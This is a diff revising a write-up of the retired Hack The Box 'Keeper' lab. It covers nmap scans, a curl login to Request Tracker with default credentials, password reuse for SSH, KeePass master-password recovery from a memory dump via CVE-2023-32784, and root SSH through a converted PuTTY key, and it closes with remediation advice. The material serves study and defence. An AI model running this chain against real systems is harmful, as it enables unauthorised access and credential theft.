@@ -25,75 +25,91 @@ skill: "Default-credential chaining and memory-dump master-password recovery"
 outcome: "Root SSH access"
 ---
 
+## At a glance
+
+| Field | Value |
+|---|---|
+| Difficulty | Easy |
+| Target environment | Ubuntu 22.04 Linux host running Request Tracker 4.4.4 behind nginx |
+| Starting position | Unauthenticated network access |
+| Objective | Default Request Tracker credentials and KeePass CVE-2023-32784 to a root SSH key |
+| Outcome | User-level SSH access, then direct root SSH access |
+
 ## Summary
 
-Keeper is an Easy-rated Hack The Box Linux lab that chains a default credential vulnerability in Request Tracker with a critical memory disclosure flaw in KeePass (CVE-2023-32784). The recorded chain authenticates to the helpdesk system using publicly documented default credentials, extracts a user password stored in an administrative comment field, recovers a KeePass master password from a crash dump via the CVE, then uses a PuTTY-format SSH key found inside the database to authenticate as root. Operator, target, credential, and archive-specific values are replaced with role-based placeholders below.
+Keeper is an Easy-rated Hack The Box Linux lab that chains a default-credential weakness in Request Tracker with the KeePass master-password memory-disclosure flaw (CVE-2023-32784). The helpdesk system is reachable with publicly documented default credentials, an administrative comment field exposes a user password, and a KeePass crash dump in that user's home directory yields the master password. An unencrypted PuTTY-format root SSH key inside the unlocked database then authenticates directly as root. Target, operator, account, and secret values are replaced with role-based placeholders; command syntax is preserved.
+
+**Attack path:** **Default Request Tracker credentials → password in a ticket comment field → SSH as low-privilege user → KeePass crash dump → CVE-2023-32784 master-password recovery → unencrypted root key in the KeePass database → PuTTY-to-OpenSSH conversion → root SSH**
 
 ## Context and Objective
 
-- **Target:** Ubuntu 22.04 Linux host running Request Tracker 4.4.4 and nginx
-- **Services exposed:** SSH (port 22), HTTP (port 80)
-- **Objective:** Achieve full compromise through the attack surface presented by the exposed services
-- **Lab context:** Hack The Box lab; all activity described was performed within the platform's isolated lab environment
+- **Target:** Ubuntu 22.04 Linux host running Request Tracker 4.4.4 and served by nginx.
+- **Exposed services:** SSH (22) and HTTP (80).
+- **Starting position:** unauthenticated network access, with no provided credentials.
+- **Objective:** reach full compromise by following the exposed services and the credential exposure they present.
+- **Constraints:** activity was confined to the Hack The Box lab environment; the ticketing application is served on a virtual host.
 
 ## Approach and Evidence
 
 ### 1. Service Enumeration
 
-Observation: two open TCP services. HTTP serves a minimal page with a hyperlink to a helpdesk ticketing application. SSH is standard OpenSSH.
-
-Action: full TCP scan, then targeted version/script scan of ports 22 and 80.
+Observation: a full TCP scan followed by a targeted version and default-script scan exposes two services. HTTP serves a minimal page containing a link to a ticketing application on a virtual host.
 
 ```bash
 nmap -p- --min-rate 10000 -oA <OUT_PREFIX> <TARGET_IP>
 nmap -p 22,80 -sCV -oA <OUT_PREFIX> <TARGET_IP>
 ```
 
-Representative excerpt (truncated):
+Truncated scan output:
 
 ```text
 22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3
 80/tcp open  http    nginx 1.18.0 (Ubuntu)
 ```
 
-Technical significance: port 80 redirects to a helpdesk application hosted on a virtual host, suggesting further attack surface behind the web layer.
+The linked page points to the helpdesk application:
 
-Result: the recorded output shows SSH and nginx with a helpdesk redirect on port 80.
+```html
+<a href="http://<APP_VHOST>/rt/">To raise an IT support ticket, please visit here</a>
+```
+
+Significance: the web service is a pointer to a helpdesk application rather than the application itself, so the ticketing layer becomes the primary attack surface.
+
+Result: SSH and nginx are exposed, and the web page links to the Request Tracker instance.
 
 ### 2. Request Tracker Default Credentials
 
-Observation: the helpdesk application is Request Tracker (RT) 4.4.4, disclosed in the login page footer. Default administrative credentials are publicly documented for this version.
-
-Action: authenticate with default credentials, then enumerate the admin interface.
+Observation: the login page footer identifies the application and version, `RT 4.4.4+dfsg-2ubuntu1 (Debian)`. Request Tracker's default administrative credentials are publicly documented.
 
 ```bash
-curl -s -c <COOKIE_FILE> -X POST http://<TARGET_HOST>/rt/NoAuth/Login.html \
+curl -s -c <COOKIE_FILE> -X POST http://<APP_VHOST>/rt/NoAuth/Login.html \
   -d 'user=<ADMIN_USER>&pass=<ADMIN_DEFAULT_PASSWORD>' -L | grep -i "logged in\|logout\|dashboard"
 ```
 
-Representative excerpt (identity generalized):
+Version disclosed in the login page footer:
 
 ```text
 RT 4.4.4+dfsg-2ubuntu1 (Debian)
-<login success indicators>
 ```
 
-Technical significance: default credentials on a production helpdesk system expose user records, ticket content, and attached files to any attacker who tries the documented defaults. Admin access also reveals a user profile with an initial password stored in a comment field.
+Significance: unchanged default credentials expose user records, ticket content, and attached files to anyone who tries the documented values.
 
-Result: the recorded output confirms admin-level authentication to the ticketing system.
+Result: the source records a successful administrator login with an accessible dashboard.
 
-### 3. User Enumeration — Credential Recovery from Comment Field
+### 3. User Enumeration and Credential Recovery
 
-Observation: the admin interface exposes user accounts. One user's profile contains an initial password in the Comments field. A ticket in the Recently Viewed section references a KeePass crash dump stored in that user's home directory.
+Observation: the administrator interface lists user accounts. One profile stores an initial password in the Comments field, and a recently viewed ticket references a KeePass crash dump in that user's home directory.
 
-Action: navigate Admin → Users, inspect the user profile and associated tickets.
+Interface: the affected profile and its associated ticket are reached through **Admin → Users**; both are reproduced below.
 
-Representative excerpt (identities generalized):
+Profile excerpt (identity generalized):
 
 ```text
 Username: <LAB_USER>
 Comments: New user. Initial password set to <LAB_USER_PASSWORD>
 ```
+
+Ticket excerpt:
 
 ```text
 Subject: Issue with Keepass Client on Windows
@@ -101,61 +117,49 @@ Attached to this ticket is a crash dump of the keepass program...
 I have saved the file to my home directory and removed the attachment...
 ```
 
-Technical significance: initial passwords must never be stored in ticketing system comment fields — they are visible to all administrative users and may be logged, backed up, or indexed. The ticket disclosure of a home-directory crash dump directly points to the privilege escalation vector.
+Significance: an initial password stored in a ticket comment is readable by every administrative user and by anyone who reaches admin access, and the ticket itself discloses where the crash dump was copied.
 
-Result: the recorded output shows a recoverable password and a disclosed crash dump path.
+Result: a user password is recovered and a crash-dump path is disclosed.
 
-### 4. SSH Access as Low-Privilege User
+### 4. SSH Access as a Low-Privilege User
 
-Observation: the recovered password grants SSH access to the low-privilege account.
-
-Action: authenticate over SSH using the recovered credential.
+Observation: the password recovered from the comment field is reused for the operating system account.
 
 ```bash
 ssh <LAB_USER>@<TARGET_HOST>
 # password: <LAB_USER_PASSWORD>
 ```
 
-Representative excerpt:
-
 ```text
 Welcome to Ubuntu 22.04.3 LTS
 <LAB_USER>@<TARGET_HOST>:~$
 ```
 
-Technical significance: the password stored in the comment field works directly for SSH, confirming credential reuse from the ticketing system to the operating system.
+Significance: the same secret crosses from the ticketing system to SSH, so a helpdesk disclosure becomes interactive host access.
 
-Result: the notes report a user-level shell and user flag in the home directory (flag content omitted).
+Result: an interactive shell as `<LAB_USER>` is obtained.
 
 ### 5. Home Directory Enumeration — KeePass Crash Dump
 
-Observation: the home directory contains an archive with a KeePass crash dump and a database file.
-
-Action: extract the archive.
+Observation: the user's home directory contains an archive holding a KeePass memory dump and a database file.
 
 ```bash
 ls -la
 unzip <ARCHIVE_FILE>
 ```
 
-Representative excerpt:
-
 ```text
-KeePassDumpFull.dmp   (process memory dump, ~242 MB)
-passcodes.kdbx         (KeePass 2.x encrypted database)
+  inflating: KeePassDumpFull.dmp
+  extracting: passcodes.kdbx
 ```
 
-Technical significance: a memory dump alongside a KeePass database immediately suggests CVE-2023-32784, which allows master password recovery from process memory.
+Significance: a process memory dump stored beside a KeePass database points directly at CVE-2023-32784, which recovers the master password from memory.
 
-Result: the recorded output shows both files extracted.
+Result: `KeePassDumpFull.dmp` and `passcodes.kdbx` are extracted.
 
-### 6. CVE-2023-32784 — KeePass Master Password Recovery from Memory
+### 6. CVE-2023-32784 — KeePass Master-Password Recovery from Memory
 
-**Vulnerability overview:**
-
-KeePass 2.x before version 2.54 stores the master password in process memory in a way that makes it recoverable from a memory dump. The root cause is how KeePass processes each character as it is typed: for each keystroke, a new managed string is allocated containing all characters typed so far (e.g., `p`, `pa`, `pas`, `pass`...). These intermediate strings are not securely zeroed and remain in the heap until garbage collection. A memory dump captures all partial strings, allowing the complete password to be reconstructed — with the exception of the first character, which never appears in a multi-character intermediate string.
-
-Action: transfer the dump and database to the attack machine, then run a PoC recovery tool.
+Observation: KeePass 2.x before 2.54 allocates a new managed string for every keystroke of the master password, so the heap retains progressively longer partial strings. Those strings are not zeroed, and a memory dump captured after entry exposes all but the first character.
 
 ```bash
 # On attack machine
@@ -164,65 +168,54 @@ scp <LAB_USER>@<TARGET_HOST>:<DATABASE_PATH> .
 python3 keepass_dump.py -f <DUMP_FILE>
 ```
 
-Representative excerpt (tool output, values generalized):
+Truncated tool output (candidate values generalized):
 
 ```text
-Possible password: ●,<PASSWORD_FRAGMENT_1>
-Possible password: ●<PASSWORD_FRAGMENT_1>
-Possible password: ●`<PASSWORD_FRAGMENT_1>
+Possible password: ●,<PASSWORD_FRAGMENT>
+Possible password: ●l<PASSWORD_FRAGMENT>
+Possible password: ●`<PASSWORD_FRAGMENT>
 ```
 
-Technical significance: the first character is unknown (shown as `●`), and some characters show multiple candidates. The pattern suggests a phrase — the attacker must resolve the correct combination through context or testing. The CVE is particularly severe because the dump can be taken at any point after the master password was entered, including hours later from a swap file or hibernation image.
+Significance: the tool cannot recover the first character, shown as `●`, and returns several candidate first characters. The remaining phrase and the user context recorded in the ticket are enough to resolve the full passphrase. Because the dump can persist in swap files and hibernation images, the exposure outlives the running application.
 
-Result: the recorded output shows partial password candidates from the memory dump.
+Result: the master-password candidate is recovered from the dump and resolved from context.
 
-### 7. KeePass Database Access — SSH Key Recovery
+### 7. KeePass Database Access — Root SSH Key Recovery
 
-Observation: the recovered master password unlocks the KeePass database. The database contains a PuTTY-format SSH private key for the root user in the Notes field of a network credential entry.
-
-Action: open the database with `kpcli`, navigate to the Network group, and extract the key.
+Observation: the resolved master password unlocks the database, whose Network group holds a PuTTY-format root SSH key in the Notes field of an entry.
 
 ```bash
-kpcli:> open <DATABASE_FILE>
-# Provide the master password when prompted
+kpcli:/> open <DATABASE_FILE>
+# master password prompt
+kpcli:/> cd passcodes/
 kpcli:/passcodes> cd Network/
 kpcli:/passcodes/Network> show -f 0
 ```
 
-Representative excerpt (credentials redacted):
+Truncated entry output (credentials redacted):
 
 ```text
 Title: <TARGET_HOST> (Ticketing Server)
 Username: <ROOT_ACCOUNT>
-Password: <ROOT_PASSWORD>
 Notes: PuTTY-User-Key-File-3: ssh-rsa
        Encryption: none
        Comment: rsa-key-<KEY_DATE>
        Public-Lines: 6
-       <PUBLIC_KEY_MATERIAL_REDACTED>
-       Private-Lines: 14
-       <PRIVATE_KEY_MATERIAL_REDACTED>
 ```
 
-Technical significance: the root user's private key is stored unencrypted in a KeePass Notes field — a critical credential-management failure. The key is in PuTTY v3 format, which is not directly compatible with OpenSSH and requires conversion.
+Significance: a root private key is stored unencrypted in a password-manager note, and the key uses the PuTTY v3 format that OpenSSH does not read directly.
 
-Result: the recorded output shows the key extracted from the database.
+Result: the unencrypted root key is extracted from the database.
 
 ### 8. PuTTY Key Conversion and Root Access
 
-Observation: PuTTY uses its own `.ppk` key format. Version 3 keys use a different encoding and MAC computation than OpenSSH keys; `ssh-keygen -i` handles only version 2 and fails on v3 keys. The `puttygen` utility handles version 3 correctly.
-
-Action: save the extracted key as a protected file, convert it with `puttygen`, then SSH as root.
+Observation: a PuTTY v3 key must be converted before OpenSSH will use it, and `puttygen` performs that conversion.
 
 ```bash
-cp <EXTRACTED_PPK_FILE> <KEY_FILE>
-sudo apt install putty-tools
 puttygen <KEY_FILE> -O private-openssh -o <OPENSSH_KEY>
 chmod 600 <OPENSSH_KEY>
 ssh -i <OPENSSH_KEY> <ROOT_ACCOUNT>@<TARGET_HOST>
 ```
-
-Representative excerpt:
 
 ```text
 Welcome to Ubuntu 22.04.3 LTS
@@ -230,32 +223,39 @@ root@<TARGET_HOST>:~# id
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
-Technical significance: the PuTTY v3 → OpenSSH conversion is required; attempting it with `ssh-keygen` produces a parse error. `puttygen` produces a standard PEM-format key usable by any SSH client. Direct root login via SSH key with no additional escalation step confirms the key was stored unencrypted in the database.
+Significance: the converted key authenticates straight to root over SSH with no further escalation, and the privileged `id` output confirms the execution context.
 
-Result: the notes report a root shell and root flag (flag content omitted).
+Result: a root SSH session is obtained.
 
 ## Challenges and Decisions
 
 | Challenge | Decision | Rationale |
 |---|---|---|
-| KeePass master password has unknown first character | Resolved by context — Danish phrase pattern | CVE-2023-32784 recovers all characters except the first; the pattern combined with user context identifies the full password |
-| PuTTY v3 key incompatibility with standard conversion | Used `puttygen` instead of `ssh-keygen -i` | `ssh-keygen` only handles PuTTY version 2 format; v3 keys fail with parse error |
+| KeePass master password recovered with an unknown first character | Resolved the remaining phrase from the user context in the ticket | CVE-2023-32784 cannot recover the first character; the rest of the phrase plus documented user context identifies the full passphrase |
+| PuTTY v3 key not convertible with `ssh-keygen` | Converted the key with `puttygen` | `ssh-keygen` handles only PuTTY v2; the v3 key produced `do_convert_from_ssh2: parse key: invalid format`, while `puttygen` emits a standard OpenSSH private key |
 
 ## Outcome
 
-The evidence establishes: user-level access via a default credential vulnerability in Request Tracker combined with a password stored in a comment field; root access via CVE-2023-32784 memory disclosure recovering a KeePass master password, unlocking a database containing an unencrypted root SSH key. Every escalation step abused a distinct credential-management failure — default credentials, plaintext password in comments, unencrypted memory dump, and unencrypted private key in a password manager.
+The evidence establishes user-level SSH access obtained from a password stored in a ticket comment, then direct root SSH access using an unencrypted PuTTY key recovered from the KeePass database. The static nginx page was enumeration-only, and no vulnerability in the operating system itself was exploited; every escalation followed exposed or recoverable credentials.
 
 ## Lessons and Recommendations
 
-1. **Change default credentials before production deployment.** Request Tracker's default `root:password` is documented in the official installation guide. Any application deployed to production must have default credentials changed as the very first post-installation step. (Lesson grounded in this chain.)
-2. **Never store credentials in ticketing system comment fields.** Initial passwords, SSH keys, and any authentication material must not be stored in comments, notes, or description fields. These fields are accessible to all administrative users and may be logged or indexed. Secrets should be delivered via a dedicated secrets manager with audit logging. (Lesson grounded in this chain.)
-3. **Update KeePass to version 2.54 or later.** CVE-2023-32784 is patched in KeePass 2.54, which uses a different API for master password handling that prevents intermediate string accumulation. Rotate all stored credentials if previously using an unpatched version, since any captured memory dump can be exploited offline. (Recommendation.)
-4. **Never store unencrypted private keys in password managers.** A KeePass database is designed to hold secrets, but storing a root SSH key in the Notes field of an entry undermines the entire trust chain. Private keys should be stored in hardware security modules or encrypted with strong, unique passphrases separate from the database. (Lesson grounded in this chain.)
-5. **Audit memory handling for sensitive applications.** Process memory dumps, swap files, and hibernation images can contain secrets long after the application closes. Applications handling credentials must use secure memory allocation and explicit zeroing. (Recommendation.)
+None of the remediations below was validated in the lab; they are recommendations.
+
+1. **Change default credentials before deployment.** Request Tracker ships documented default administrative credentials, and unchanged defaults exposed the entire ticketing system. *Recommendation:* require a credential change before an application is reachable, and scan for vendor defaults after deployment. *Detection:* alert on successful logins to default or unused administrative accounts.
+2. **Keep secrets out of ticket fields.** A user's initial password sat in a comment field and was reused for SSH. *Recommendation:* deliver initial credentials out of band, force rotation on first use, and store secrets in a dedicated manager with audit logging. *Detection:* scan ticket and profile text for credential-like patterns.
+3. **Patch KeePass and limit dump exposure.** CVE-2023-32784 lets the master password be recovered from any memory dump taken after entry, including swap and hibernation images. *Recommendation:* upgrade KeePass to 2.54 or later and rotate stored credentials, since previously captured dumps remain exploitable offline.
+4. **Protect and encrypt private keys.** A root SSH key stored unencrypted in a KeePass note turned a database disclosure into direct host compromise. *Recommendation:* store keys encrypted with a strong, separate passphrase, or in hardware-backed storage, rather than as plaintext note content.
 
 ## References
 
-- Hack The Box machine **[Keeper](https://app.hackthebox.com/machines/Keeper)** (retired lab; no active-instance detail)
-- CVE-2023-32784: KeePass 2.x master password memory disclosure
-- KeePass 2.54 security update notes
-- Best Practical Request Tracker default credentials documentation
+- [Hack The Box — Keeper](https://app.hackthebox.com/machines/Keeper) (retired machine)
+- [Request Tracker — README](https://docs.bestpractical.com/rt/4.4.4/README.html) (vendor documentation of RT's default `root` / `password` credentials)
+- [NVD — CVE-2023-32784](https://nvd.nist.gov/vuln/detail/CVE-2023-32784)
+- [KeePass 2.54 release notes](https://keepass.info/news/n230603_2.54.html) (release that fixed CVE-2023-32784)
+- [keepass_dump](https://github.com/z-jxy/keepass_dump) (memory-dump master-password recovery tool)
+- [kpcli](https://sourceforge.net/projects/kpcli/) (KeePass database command-line client)
+- [PuTTY — `puttygen`](https://www.putty.org/) (PuTTY key generation and format conversion)
+- [OpenSSH manual pages](https://www.openssh.com/manual.html) (`ssh`, `scp`, and `ssh-keygen`)
+- [curl man page](https://curl.se/docs/manpage.html)
+- [Nmap Reference Guide](https://nmap.org/book/man.html)
